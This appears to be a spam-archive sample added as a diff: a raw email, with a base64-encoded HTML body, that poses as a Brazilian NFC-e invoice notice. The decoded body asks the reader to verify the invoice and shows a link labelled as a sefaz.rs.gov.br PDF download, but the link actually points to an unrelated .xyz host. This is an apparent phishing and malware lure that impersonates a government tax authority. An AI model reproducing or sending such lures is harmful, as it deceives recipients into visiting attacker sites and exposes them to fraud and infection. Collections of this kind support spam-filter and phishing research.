@@ -1,0 +1,53 @@
+Return-Path: <noreply70778@marianaschtz06.vaptvuptcobranca.trade>
+Delivered-To: bruce@home.untroubled.org
+Received: (qmail 3515590 invoked from network); 23 Apr 2021 18:18:47 -0000
+Received: (qmail 21618 invoked by uid 222); 23 Apr 2021 18:18:47 -0000
+Return-Path: <noreply70778@marianaschtz06.vaptvuptcobranca.trade>
+Delivered-To: virtmail-bruce@untroubled.org
+Received: (qmail 21615 invoked from network); 23 Apr 2021 18:18:47 -0000
+Received: from marianaschtz06.vaptvuptcobranca.trade (marianaschtz06.vaptvuptcobranca.trade [217.25.90.3])
+  by vx0.untroubled.org ([45.63.65.23])
+  with ESMTP via TCP; 23 Apr 2021 18:18:46 -0000
+Received: by marianaschtz06.vaptvuptcobranca.trade (Exim, from userid 33)
+	id 81E3C638E3; Fri, 23 Apr 2021 15:18:17 -0300 (-03)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+	d=marianaschtz06.vaptvuptcobranca.trade; s=mail; t=1619201922;
+	bh=GrJm4DO+Jme/7blP+OBAaoxqkVAgtIgP6vh389zY6Ko=;
+	h=To:Subject:From:Date:Reply-To:From;
+	b=EzsVUAteyHFduZDFMr8S3tmJlaca2Y2i4xgLbT+FjePaciVYEfNEdrrVDZ/zxwviD
+	 7fU+ZcP69/6CgqWM9efVsqGIvvrFSFz1TV2lLFZbyhhjuKZsWDRgLMnPyz54FexU6S
+	 dukLLjrwqwO5M/T8oc23xJCcfOJQdOaRDNlL+SySY26ANAjDpB8/ctc0UxvFVIVI3T
+	 Rpt2PPscvNogs8PNRWe7PBTCdKCGuG3oyV5F11HrcD9rICK1hTQGkvwBHuvrNMhgaA
+	 Tl2+vbFo5wEsQH+sWiofBA3KQg/0fJkEZ1WKDN8eSTwFImW9UX5X9brTBkhxy8/POg
+	 q0kSfMogTifAw==
+To: bruce@untroubled.org
+Subject: NFC-e 4321048787328677897787328
+MIME-Version: 1.0
+From:  Fiscal Bean [EMAIL]-[DATA]-684759. <noreply70778@marianaschtz06.vaptvuptcobranca.trade>
+Date: Fri, 23 Apr 2021 15:18:16 -0300
+Reply-To: noreply70778@marianaschtz06.vaptvuptcobranca.trade
+Content-type: multipart/mixed; boundary="-------230420211816_b305546e79a0b29c9a76a11ae91cf1a2"
+Message-Id: <20210423181842.81E3C638E3@marianaschtz06.vaptvuptcobranca.trade>
+Content-Length: 1244
+
+---------230420211816_b305546e79a0b29c9a76a11ae91cf1a2
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: base64
+
+PEhUTUw+DQoNCg0KIGJydWNlQHVudHJvdWJsZWQub3JnPEJSPjxCUj4NCg0KRXN0YSBtZW5zYWdl
+bSByZWZlcmUtc2UgJiMyMjQ7IE5GQ2UgZGUgcyYjMjMzO3JpZS9uJiMyNTA7bWVybyAzMS8xNTcx
+NiwgZW1pdGlkYSBlbSAyMy8wNC8yMDIxIDE1OjE4OjE2IHBvcjo8QlI+DQo8QlI+DQpSYXomIzIy
+NztvIFNvY2lhbDogPGI+R0xPQkFMIERJU1RSIERFIEJFTlMgREUgQ09OU1VNTyBMVERBDQpDTlBK
+OiA4OS4yODUuOTExLzg0NDctNzMNCjxCUj4NCjxCUj4NClBhcmEgdmVyaWZpY2FyIGEgYXV0b3Jp
+emEmIzIzMTsmIzIyNztvIGRhIFNFRkFaIHJlZmVyZW50ZSAmIzIyNDsgbm90YSBhY2ltYSBtZW5j
+aW9uYWRhLCBhY2Vzc2UgbyBzaXRlOg0KPEJSPg0KIDxicj48YSBocmVmPSJodHRwOi8vNmR1YWJy
+LndlYmNvbWVyY2V4ZC54eXovSzE4eEhGcEEvRnU0SHZGeENBa0J2SFU5TzUvL0Zpc2NhbDAyNDUw
+MjIvNzkwMzY4L05GLVMxNTcxNjg0NDciIHRhcmdldD0iX2JsYW5rIj53d3cuc2VmYXoucnMuZ292
+LmJyL25mY2UvZG93bG9hZC5wZGYuPC9hPjxicj4uDQogPEJSPg0KQ2hhdmUgZGUgYWNlc3NvOiA0
+MzIxMDQ3OTAzNjgxMTAxNzk3OTAzNjgxMDAwMDE3OTAzNjg0MzU5ODczDQo8QlI+DQpQcm90b2Nv
+bG86IDE0MzIxMDc5MDM2ODM5NzxCUj48QlI+DQo8L0hUTUw+DQo8QlI+DQo8QlI+DQpPQlMuOiBF
+c3RlIGUtbWFpbCBmb2kgZW52aWFkbyBhdXRvbWF0aWNhbWVudGUgcGVsbyBzaXN0ZW1hIGRlIE5G
+Q2UgZGEgTElOWCBTSVNURU1BUyBFIENPTlNVTFRPUklBIExUREEu
+
+---------230420211816_b305546e79a0b29c9a76a11ae91cf1a2--
+
